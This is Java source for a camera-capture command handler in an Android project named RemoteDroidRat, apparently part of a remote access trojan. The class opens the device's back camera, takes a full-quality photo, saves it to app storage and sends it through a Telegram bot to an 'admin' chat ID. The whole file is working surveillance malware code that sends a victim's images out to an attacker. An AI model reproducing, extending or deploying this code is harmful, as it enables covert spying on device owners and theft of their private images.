package com.KaranKumar.RemoteDroidRat.commandActions;

import android.content.Context;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.view.SurfaceView;
import android.widget.Toast;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

import com.KaranKumar.RemoteDroidRat.telegramBot.TelegramBotApi;
import com.KaranKumar.RemoteDroidRat.adminInfo;
import android.view.SurfaceHolder;

public class getBackCamImage {

    private Camera camera;
    private Context context;
    private TelegramBotApi telegramBot;
    private adminInfo admin;
    private int cameraId = -1;
    private SurfaceView surfaceView; // Declare SurfaceView as a class variable

    public getBackCamImage(Context context, SurfaceView surfaceView) {
        this.context = context;
        this.telegramBot = new TelegramBotApi(context);
        this.admin = new adminInfo(context);
        this.surfaceView = surfaceView; // Initialize SurfaceView here
		
		SurfaceHolder surfaceHolder = surfaceView.getHolder();
        surfaceHolder.addCallback(new SurfaceHolder.Callback() {
				@Override
				public void surfaceCreated(SurfaceHolder holder) {
					// Surface is created, now you can set it to the camera
				}

				@Override
				public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {
					// Surface size or format has changed, handle accordingly
				}

				@Override
				public void surfaceDestroyed(SurfaceHolder holder) {
					// Surface is destroyed, release the camera
					releaseCamera();
				}
			});

        // Make sure the surface type is set to SURFACE_TYPE_PUSH_BUFFERS for older devices
        surfaceHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
    }
	
    

    public void captureImage() {
		if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
			Toast.makeText(context, "No camera on this device", Toast.LENGTH_LONG).show();
		} else {
			cameraId = getBackFacingCameraId();
			if (cameraId >= 0) {
				try {
					safeCameraOpen(cameraId);

					if (camera != null) {

						if (surfaceView != null) {
							camera.setPreviewDisplay(surfaceView.getHolder()); // Use the class variable
							camera.startPreview();
							Camera.Parameters params = camera.getParameters();
							params.setJpegQuality(100);
							camera.setParameters(params);
							camera.takePicture(null, null, mCall);
						} else {

						}
					} else {
						Toast.makeText(context, "Unable to open the camera", Toast.LENGTH_LONG).show();
					}
				} catch (IOException e) {
					e.printStackTrace();
				} finally {
					// Stop the preview after capturing the image
					if (camera != null) {
						camera.stopPreview();
					}
				}
			} else {
				Toast.makeText(context, "No back-facing camera found.", Toast.LENGTH_LONG).show();
			}
		}
	}

    private int getBackFacingCameraId() {
        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
        int cameraCount = Camera.getNumberOfCameras();

        for (int i = 0; i < cameraCount; i++) {
            Camera.getCameraInfo(i, cameraInfo);
            if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                return i;
            }
        }

        return -1; // No back-facing camera found
    }

    private Camera.PictureCallback mCall = new Camera.PictureCallback() {
        public void onPictureTaken(byte[] data, Camera camera) {
            String filePath = saveImageToFile(data);
            sendImageToTelegramBot(filePath);
            releaseCamera();
        }
    };

    private String saveImageToFile(byte[] data) {
        String filePath = context.getFilesDir() + File.separator + "captured_image.jpg";
        try {
            FileOutputStream fos = new FileOutputStream(filePath);
            fos.write(data);
            fos.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return filePath;
    }

    private void sendImageToTelegramBot(String filePath) {
        if (isNetworkConnected()) {
            telegramBot.sendImage(admin.getChatId(), filePath);
			telegramBot.sendFile(admin.getChatId(), filePath);
        }
    }

    private boolean isNetworkConnected() {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mobileNetworkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        return mobileNetworkInfo != null && mobileNetworkInfo.isConnected();
    }

    private boolean safeCameraOpen(int id) {
		boolean qOpened = false;
		try {
			releaseCamera();
			camera = Camera.open(id);
			qOpened = (camera != null);
		} catch (Exception e) {
			e.printStackTrace();
		}
		return qOpened;
	}

    public void releaseCamera() {
		if (camera != null) {
			try {
				camera.stopPreview();
				camera.release();
			} catch (Exception e) {
				e.printStackTrace();
			} finally {
				camera = null;
			}
		}
	}
}
